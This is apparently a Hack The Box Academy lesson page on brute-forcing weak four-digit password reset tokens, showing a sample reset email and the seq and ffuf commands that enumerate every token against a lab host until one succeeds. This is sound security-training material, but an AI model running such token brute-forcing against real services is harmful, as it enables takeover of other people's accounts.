<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/767
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 767
// Section Title: Brute-Forcing Password Reset Tokens
// Page Title: Hack The Box - Academy
// Page Number: 5
-->

# Brute-Forcing Password Reset Tokens

**Module Name:** Broken Authentication **Page Number:** 5

#### 

#### BROKEN AUTHENTICATION

# Brute-Forcing Password Reset Tokens

## Identifying Weak Reset Tokens

![https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_1.png](https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_1.png)

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```

## Attacking Weak Reset Tokens

``` shell-session
ndefstathiou@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

``` shell-session
ndefstathiou@htb[/htb]$ head tokens.txt

0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
```

``` shell-session
ndefstathiou@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"

<SNIP>

[Status: 200, Size: 2667, Words: 538, Lines: 90, Duration: 1ms]
    * FUZZ: 6182
```

![https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_2.png](https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_2.png)

# 

# 

#### Questions

####